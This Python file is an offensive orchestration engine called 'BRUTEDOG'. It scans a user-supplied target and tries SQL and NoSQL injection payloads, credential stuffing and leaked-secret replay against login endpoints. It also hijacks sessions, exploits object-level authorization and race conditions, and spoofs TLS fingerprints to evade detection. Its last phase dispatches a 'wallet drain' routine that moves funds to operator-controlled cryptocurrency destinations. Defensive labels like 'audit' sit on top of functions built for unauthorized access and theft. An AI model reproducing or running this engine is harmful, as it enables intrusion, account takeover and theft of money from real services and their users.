#!/usr/bin/env python3
"""
BRUTEDOG ENGINE v7.3 — State-Machine Logic & High-Aggression Exploitation Engine
Features:
- Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
- Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
- Stateful intelligence ingestion from v7.0 crawler state-machine graph & DOM sink inspector
- Automated BOLA and state-skipping vector evaluation across security tiers
- Live autonomous test-account session propagation across exploit modules
- Persistent Session Pool & Response Fingerprinter integration for false-positive elimination
- HTTP/2 single-packet concurrency engine integration for race condition logic fuzzing
- Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
- Automated Wallet Drain Probe Integration using operator destinations from drainer.py
- Automated Referral Validation Gateway Fuzzing Integration (test_referral.py)
- Zero-disk in-memory intelligence collection & live telemetry streaming
"""
import asyncio
import json
import re
import socket
import sys
import time
from urllib.parse import urlsplit
from concurrent.futures import ThreadPoolExecutor

# Import weaponized offensive modules, transport middleware & live telemetry streamer
from modules.transport import SecureTransport
from modules.session_pool import PersistentSessionPool
from modules.response_diff import ResponseFingerprinter
from modules.scanner import run_port_scanner
from modules.crawler import crawl_target
from modules.db_assault import run_nosql_assault
from modules.session_hijack import run_session_hijack
from modules.race_condition import run_race_condition_test
from modules.live_login_verifier import execute_live_login_verification
from modules.drainer import run_drainer_engine, OPERATOR_DESTINATIONS
from modules.wallet_drain_probe import execute_probe
from modules.telemetry import stream_proof

# Import the referral validation bypass probe
from modules.test_referral import audit_referral_logic

# ============================================================
# CONFIGURATION
# ============================================================
REQUEST_TIMEOUT = 8
MAX_WORKERS = 5
MAX_RESPONSE_SIZE = 200_000

FALLBACK_LOGIN_PATHS = [
    "/api/auth/callback/credentials",
    "/api/auth/login",
    "/api/auth/signin",
    "/api/v1/auth/login",
    "/api/v1/users/login",
    "/api/login",
    "/api/signin",
    "/api/session",
    "/login",
    "/signin",
    "/auth/login",
    "/auth",
    "/user/login",
    "/admin/login",
    "/api/admin/login",
]

ERROR_PATTERNS = {
    "SQL syntax": re.compile(
        r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|syntax error",
        re.I,
    ),
    "MongoDB error": re.compile(
        r"mongodb|mongosh|mongoerror|bsonerror|casttoobjectid",
        re.I,
    ),
    "Database exception": re.compile(
        r"database exception|query failed|"
        r"invalid query|database error|unhandled exception",
        re.I,
    ),
}

# ============================================================
# OUTPUT COLORS & FORMATTING
# ============================================================
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

def info(message):
    sys.stdout.write(f"{CYAN}[*] {message}{RESET}\n")
    sys.stdout.flush()

def success(message):
    sys.stdout.write(f"{GREEN}[+] {message}{RESET}\n")
    sys.stdout.flush()

def warning(message):
    sys.stdout.write(f"{YELLOW}[!] {message}{RESET}\n")
    sys.stdout.flush()

def error(message):
    sys.stdout.write(f"{RED}[-] {message}{RESET}\n")
    sys.stdout.flush()

def section(title):
    sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
    sys.stdout.flush()

# ============================================================
# TARGET HANDLING
# ============================================================
def get_target():
    section("BRUTEDOG TARGET CONFIGURATION")
    print("Enter a domain, IP address, or server URL.")
    target = input("\nTarget: ").strip()
    if not target:
        raise ValueError("Target cannot be empty.")
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Unsupported protocol.")
    if not parsed.hostname:
        raise ValueError("Invalid hostname.")
    return target

def resolve_target(host):
    try:
        results = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
        return sorted({item[4][0] for item in results})
    except socket.gaierror:
        return []

# ============================================================
# ADAPTIVE RESPONSE ANALYSIS & LIVE TELEMETRY
# ============================================================
def detect_database_errors(body):
    findings = []
    for label, pattern in ERROR_PATTERNS.items():
        if pattern.search(body or ""):
            findings.append(label)
    return findings

def inspect_cookie_security(headers):
    cookie = headers.get("set-cookie", "")
    if not cookie:
        return []
    issues = []
    lower = cookie.lower()
    if "secure" not in lower:
        issues.append("Secure attribute missing")
    if "httponly" not in lower:
        issues.append("HttpOnly attribute missing")
    if "samesite" not in lower:
        issues.append("SameSite attribute missing")
    return issues

def classify_and_adapt(response, current_payload, endpoint="", fingerprinter=None):
    status = response.get("status", 0)
    body = response.get("body", "")
    headers = response.get("headers", {})
    findings = []
    mutated_payloads = []

    if fingerprinter:
        is_fp, fp_reason = fingerprinter.is_false_positive(status, body, headers)
        if is_fp:
            return [], []
    
    # Strict SPA Shell Defense: Ignore generic client-side React/Next.js router shells
    is_spa_shell = (
        "<div id=\"root\"></div>" in body or 
        "<div id=\"__next\"></div>" in body or 
        "<div id=\"app\"></div>" in body or
        len(body.strip()) < 200
    )
    
    has_valid_auth_indicator = any(k in body.lower() for k in ["access_token", "\"role\":\"admin\"", "\"user_id\":", "auth_token", "session_id", "cryptobyte"])
    
    if status in [200, 201, 302] and not is_spa_shell and (has_valid_auth_indicator or "token" in body.lower()):
        extracted_proof = {}
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                extracted_proof = {k: v for k, v in data.items() if any(sub in k.lower() for sub in ["token", "session", "cookie", "auth", "key"])}
        except:
            extracted_proof = {"raw_response_snippet": body[:200]}

        stream_proof("AUTHENTICATION_BYPASS", endpoint, current_payload, body, extracted_proof or {"status": status})

        findings.append({
            "type": "AUTHENTICATION_BYPASS_SUCCESS",
            "evidence": f"Status {status} with verified non-SPA session payload",
            "status": status,
        })

    db_errors = detect_database_errors(body)
    for db_error in db_errors:
        sys.stdout.write(f"{YELLOW}[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...{RESET}\n")
        sys.stdout.flush()
        findings.append({
            "type": "POTENTIAL_DATABASE_INJECTION",
            "evidence": db_error,
            "status": status,
        })
        if "MongoDB" in db_error:
            mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
        elif "SQL" in db_error:
            mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})

    for issue in inspect_cookie_security(headers):
        findings.append({
            "type": "SESSION_COOKIE_CONFIGURATION",
            "evidence": issue,
            "status": status,
        })
        
    return findings, mutated_payloads

def verify_hijacked_session(transport, endpoint):
    sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected route: {endpoint}{RESET}\n")
    status, headers, body = transport.request("GET", endpoint)
    
    is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body
    if status == 200 and not is_spa_shell and len(body) > 100:
        stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": 200})
        return True
    else:
        sys.stdout.write(f"{RED}[-] Session verification returned status {status} or generic SPA shell. Inactive.{RESET}\n")
        return False

# ============================================================
# ACTIVE ADAPTIVE ENDPOINT TESTING
# ============================================================
def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, fingerprinter=None):
    endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
    info(f"Targeting endpoint (State-Machine Adaptive Mode): {endpoint}")
    results = []
    
    test_queue = [
        {"name": "NoSQL Operator Probe", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
        {"name": "SQLi Union Probe", "payload": {"username": "admin' OR '1'='1", "password": "password"}},
        {"name": "Admin Default Stuffing", "payload": {"username": "admin", "password": "password123"}},
        {"name": "Malformed Type Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}}
    ]

    if leaked_secrets:
        for k, v in leaked_secrets.items():
            test_queue.insert(0, {"name": f"Leaked Secret Replay ({k})", "payload": {k: v, "code": v}})

    if credentials_list and isinstance(credentials_list, list):
        for cred in credentials_list:
            if isinstance(cred, dict):
                test_queue.insert(0, {"name": "User Credential Stuffing", "payload": cred})

    executed_payloads = set()

    while test_queue:
        current_test = test_queue.pop(0)
        payload_key = json.dumps(current_test["payload"], sort_keys=True)
        if payload_key in executed_payloads:
            continue
        executed_payloads.add(payload_key)

        status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
        if status == 0:
            continue
            
        res_obj = {"status": status, "headers": headers, "body": body}
        findings, dynamic_mutations = classify_and_adapt(res_obj, current_test["payload"], endpoint=endpoint, fingerprinter=fingerprinter)
        
        if findings:
            results.append({
                "endpoint": endpoint,
                "test": current_test["name"],
                "status": status,
                "elapsed": 0.1,
                "findings": findings,
            })

        for idx, mutant in enumerate(dynamic_mutations, 1):
            test_queue.insert(0, {
                "name": f"Adaptive Mutant #{idx}",
                "payload": mutant
            })
        
    return results

# ============================================================
# ENGINE ORCHESTRATOR
# ============================================================
async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.3")
    try:
        if target_host:
            target_url = target_host.strip()
            if "://" not in target_url:
                target_url = "https://" + target_url
        else:
            target_url = get_target()

        parsed = urlsplit(target_url)
        host = parsed.hostname
        secure = parsed.scheme == "https"
        port = parsed.port or (443 if secure else 80)
        base_path = parsed.path.rstrip("/")
    except Exception as exc:
        error(f"Target configuration failed: {exc}")
        return [], 0.0

    protocol = "HTTPS" if secure else "HTTP"
    info(f"Target Host : {host}")
    info(f"Target Port : {port}")
    info(f"Protocol    : {protocol}")
    
    section("DNS RESOLUTION")
    addresses = resolve_target(host)
    if not addresses:
        error("DNS resolution failed.")
        return [], 0.0
    for address in addresses:
        success(f"Resolved: {address}")

    # ========================================================
    # SCANNER V2.0 INTEGRATION (Advanced Service & Header Audit)
    # ========================================================
    section("ADVANCED NETWORK & SERVICE RECON (SCANNER V2.0)")
    try:
        scan_results = await run_port_scanner(host, concurrency=20)
        if scan_results.get("status") == "COMPLETED":
            open_port_list = scan_results.get("open_ports", [])
            success(f"Scanner V2.0 completed. Found {len(open_port_list)} open ports.")
            
            # Log security header gaps discovered by Scanner V2.0
            for p in open_port_list:
                missing_hdrs = p.get("details", {}).get("http", {}).get("missing_security_headers", [])
                if missing_hdrs:
                    warning(f"Port {p['port']} missing security headers: {missing_hdrs}")
    except Exception as exc:
        warning(f"Scanner integration warning: {exc}")
        
    start = time.monotonic()
    
    transport = SecureTransport(target_url)
    session_pool = PersistentSessionPool(base_url=target_url, verify_ssl=False, http2=True)
    fingerprinter = ResponseFingerprinter()

    try:
        f_status, f_headers, f_body = transport.request("GET", "/brutedog-nonexistent-baseline-404")
        fingerprinter.capture_baseline("soft_404", f_status, f_body, f_headers)
        info("[+] Captured dynamic 404 response baseline for false-positive reduction.")
    except Exception:
        pass

    section("STATEFUL STATE-MACHINE MAPPING & RECON")
    recon_data = {}
    discovered_paths = []
    leaked_secrets = {}
    bola_vulnerabilities = []
    session_cookie_payload = None

    try:
        recon_data = crawl_target(transport)
        if isinstance(recon_data, dict):
            discovered_paths = recon_data.get("endpoints", [])
            leaked_secrets = recon_data.get("leaked_secrets", {})
            bola_vulnerabilities = recon_data.get("bola_vulnerabilities", {})
            session_cookie_payload = recon_data.get("session_cookie")
    except Exception as exc:
        warning(f"State-machine crawler encountered an issue: {exc}. Falling back to default list.")

    if not discovered_paths:
        discovered_paths = FALLBACK_LOGIN_PATHS

    # Bulletproof Type-Agnostic Cookie Synchronization (Eliminates 'str' object has no attribute 'domain')
    active_cookies = session_cookie_payload if session_cookie_payload else getattr(transport, "cookie_jar", None)
    if active_cookies:
        success("Propagating active operator session cookie across transport layer safely.")
        try:
            if isinstance(active_cookies, dict):
                for k, v in active_cookies.items():
                    session_pool.cookie_jar.set(k, v)
                    if hasattr(transport, "cookie_jar") and isinstance(transport.cookie_jar, dict):
                        transport.cookie_jar[k] = v
            elif isinstance(active_cookies, str):
                for pair in active_cookies.split(";"):
                    if "=" in pair:
                        k, v = pair.strip().split("=", 1)
                        if k.lower() not in ["path", "expires", "domain", "samesite", "secure", "httponly"]:
                            session_pool.cookie_jar.set(k, v)
            elif hasattr(active_cookies, "items"):
                for k, v in active_cookies.items():
                    session_pool.cookie_jar.set(k, v)
            else:
                session_pool.cookie_jar.update(active_cookies)
        except Exception as sync_exc:
            warning(f"Cookie synchronization notice: {sync_exc}")

        verify_hijacked_session(transport, "/dashboard")

    # Dispatch Referral Gateway Validation Probe against /user/register
    section("REFERRAL GATEWAY VALIDATION AUDIT")
    try:
        info("Dispatching referral validation bypass audit against /user/register...")
        await asyncio.to_thread(audit_referral_logic)
    except Exception as exc:
        warning(f"Referral audit probe encountered an issue: {exc}")

    if leaked_secrets:
        warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")

    if bola_vulnerabilities:
        warning(f"Discovered {len(bola_vulnerabilities)} pre-validated BOLA / State-Skipping routes!")
        
        section("LIVE BOLA / STATE-SKIPPING VERIFICATION ASSAULT")
        for bola_route in bola_vulnerabilities:
            execute_live_login_verification(
                target_url=target_url,
                endpoint=bola_route,
                cookie_dict=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else None
            )

    section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
    all_results = []
    semaphore = asyncio.Semaphore(MAX_WORKERS)
    
    async def worker(path):
        async with semaphore:
            return await asyncio.to_thread(
                test_endpoint, transport, path, credentials_list, leaked_secrets, fingerprinter
            )
            
    tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
    
    for completed in asyncio.as_completed(tasks):
        try:
            results = await completed
            if results:
                all_results.extend(results)
        except Exception as exc:
            error(f"Endpoint worker failed: {exc}")

    try:
        await run_nosql_assault(target_url, port=port, use_ssl=secure)
    except Exception as exc:
        error(f"Database assault failed: {exc}")

    try:
        hijack_results = await run_session_hijack(target_url, port=port, use_ssl=secure)
        if hijack_results:
            for finding in hijack_results:
                if finding.get("status") == "VERIFIED_ACCESS":
                    execute_live_login_verification(
                        target_url=target_url,
                        endpoint=finding.get("endpoint", "/admin"),
                        cookie_dict=dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else None,
                        token=finding.get("forged_token")
                    )
    except Exception as exc:
        error(f"Session hijack failed: {exc}")

    try:
        await run_race_condition_test(
            target_url, 
            port=port, 
            use_ssl=secure, 
            session_pool=session_pool
        )
    except Exception as exc:
        error(f"Race condition module failed: {exc}")

    # Phase 4: Multi-Chain Liquidity Auditor & Wallet Drain Probe Integration
    try:
        await run_drainer_engine(target_url)
        
        # Execute automated financial endpoint assault using operator wallet destination
        operator_evm_dest = OPERATOR_DESTINATIONS.get("ETHEREUM")
        info(f"[*] Dispatching Wallet Drain Probe with operator destination: {operator_evm_dest}")
        
        session_cookies_dict = dict(transport.cookie_jar) if isinstance(transport.cookie_jar, dict) else {}
        await asyncio.to_thread(
            execute_probe, 
            session_cookies=session_cookies_dict, 
            target_wallet=operator_evm_dest
        )
    except Exception as exc:
        error(f"Drainer / liquidity audit & probe engine failed: {exc}")
            
    duration = round(time.monotonic() - start, 2)
    
    section("ENGINE SUMMARY")
    tested = len(all_results)
    potential = sum(len(item["findings"]) for item in all_results) + len(bola_vulnerabilities)
    success(f"Target: {host}")
    success(f"Discovered/Mapped endpoints: {len(discovered_paths)}")
    success(f"BOLA / State-Skipping hits: {len(bola_vulnerabilities)}")
    success(f"Total adaptive requests executed: {tested}")
    success(f"Vulnerability / Exploitation hits: {potential}")
    success(f"Engine duration: {duration}s")
    section("ENGINE COMPLETE")
    return all_results, duration

if __name__ == "__main__":
    try:
        asyncio.run(run_autonomous_engine())
    except KeyboardInterrupt:
        warning("Engine interrupted by operator.")
    except Exception as exc:
        error(f"Engine failure: {exc}")
